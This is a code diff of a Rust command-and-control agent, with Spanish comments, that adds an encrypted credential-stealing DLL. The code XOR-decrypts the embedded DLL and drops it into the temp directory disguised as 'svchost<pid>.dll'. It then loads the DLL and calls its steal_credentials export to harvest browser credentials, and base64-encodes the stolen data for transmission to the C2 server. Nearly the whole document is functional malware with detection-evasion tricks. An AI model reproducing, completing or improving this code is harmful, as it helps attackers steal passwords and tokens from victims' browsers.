@@ -1,8 +1,9 @@
 #![windows_subsystem = "console"]
 
 mod config;
-mod stealer;
 
+#[cfg(target_os = "windows")]
+use std::ffi::CStr;
 use std::io::{BufRead, BufReader, Write};
 use std::net::TcpStream;
 use std::process::Command;
@@ -12,6 +13,10 @@ use std::fs;
 use std::path::Path;
 
 const DELIMITER: &str = "\n<<END>>\n";
+
+// DLL encriptada del stealer (generada por el builder)
+const ENCRYPTED_DLL: &[u8] = include_bytes!("../encrypted_stealer.bin");
+const DLL_KEY: &[u8] = include_bytes!("../dll_key.bin");
 
 fn main() {
     println!("DEBUG: C2R2 Agent v2.0 - Direct Connection");
@@ -253,19 +258,108 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
     Ok(result)
 }
 
-/// Roba credenciales de browsers y las formatea para enviar al C2
+/// Roba credenciales de browsers cargando la DLL encriptada
+#[cfg(target_os = "windows")]
 fn steal_browser_credentials() -> String {
-    let stolen_data = stealer::steal_all();
+    use std::os::raw::c_char;
     
-    if stolen_data.is_empty() {
-        return format!("__ERROR__:No se encontraron credenciales ni tokens{}", DELIMITER);
+    println!("DEBUG: Desencriptando DLL de stealer...");
+    
+    // 1. Desencriptar DLL con XOR
+    let dll_bytes = xor_decrypt(ENCRYPTED_DLL, DLL_KEY);
+    println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+    
+    // 2. Escribir DLL temporalmente (Windows no permite LoadLibrary desde memoria fácilmente)
+    let temp_dir = std::env::temp_dir();
+    let dll_path = temp_dir.join(format!("svchost{}.dll", std::process::id()));
+    
+    if let Err(e) = fs::write(&dll_path, &dll_bytes) {
+        return format!("__ERROR__:Error escribiendo DLL temporal: {}{}", e, DELIMITER);
     }
     
-    let mut output = String::from("═══ DATOS ROBADOS ═══\n");
-    output.push_str(&format!("Total: {} items encontrados\n", stolen_data.total_count()));
-    output.push_str(&stolen_data.to_string());
+    println!("DEBUG: DLL temporal: {}", dll_path.display());
     
-    // Codificar en Base64 para transmisión segura
-    let encoded = stealer::common::base64_encode(output.as_bytes());
+    // 3. Cargar DLL y ejecutar función
+    let result = unsafe {
+        use winapi::um::libloaderapi::{LoadLibraryW, GetProcAddress, FreeLibrary};
+        use std::ffi::OsStr;
+        use std::os::windows::ffi::OsStrExt;
+        
+        // Convertir ruta a wide string
+        let wide_path: Vec<u16> = OsStr::new(dll_path.to_str().unwrap())
+            .encode_wide()
+            .chain(Some(0))
+            .collect();
+        
+        let dll_handle = LoadLibraryW(wide_path.as_ptr());
+        if dll_handle.is_null() {
+            fs::remove_file(&dll_path).ok();
+            return format!("__ERROR__:Error cargando DLL (LoadLibrary failed){}", DELIMITER);
+        }
+        
+        println!("DEBUG: DLL cargada exitosamente");
+        
+        // Obtener función steal_credentials
+        let func_name = b"steal_credentials\0";
+        let steal_fn_ptr = GetProcAddress(dll_handle, func_name.as_ptr() as *const i8);
+        
+        if steal_fn_ptr.is_null() {
+            FreeLibrary(dll_handle);
+            fs::remove_file(&dll_path).ok();
+            return format!("__ERROR__:Función steal_credentials no encontrada{}", DELIMITER);
+        }
+        
+        // Ejecutar función
+        let steal_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(steal_fn_ptr);
+        let creds_ptr = steal_fn();
+        
+        if creds_ptr.is_null() {
+            FreeLibrary(dll_handle);
+            fs::remove_file(&dll_path).ok();
+            return format!("__ERROR__:steal_credentials retornó NULL{}", DELIMITER);
+        }
+        
+        // Leer resultado
+        let creds_str = CStr::from_ptr(creds_ptr).to_string_lossy().to_string();
+        
+        // Liberar string (llamar a free_credentials_string)
+        let free_func_name = b"free_credentials_string\0";
+        let free_fn_ptr = GetProcAddress(dll_handle, free_func_name.as_ptr() as *const i8);
+        if !free_fn_ptr.is_null() {
+            let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_fn_ptr);
+            free_fn(creds_ptr);
+        }
+        
+        // Cerrar DLL
+        FreeLibrary(dll_handle);
+        
+        creds_str
+    };
+    
+    // 4. Eliminar DLL temporal
+    fs::remove_file(&dll_path).ok();
+    
+    println!("DEBUG: Credenciales obtenidas: {} bytes", result.len());
+    
+    // 5. Verificar si hubo error
+    if result.starts_with("ERROR:") {
+        return format!("__ERROR__:{}{}", result, DELIMITER);
+    }
+    
+    // 6. Codificar en Base64 y enviar
+    let encoded = base64_encode(result.as_bytes());
     format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
+}
+
+#[cfg(not(target_os = "windows"))]
+fn steal_browser_credentials() -> String {
+    format!("__ERROR__:Stealer solo soportado en Windows{}", DELIMITER)
+}
+
+/// Desencripta datos con XOR (igual que en builder)
+fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
+    data.iter()
+        .enumerate()
+        .map(|(i, &byte)| byte ^ key[i % key.len()])
+        .collect()
 }
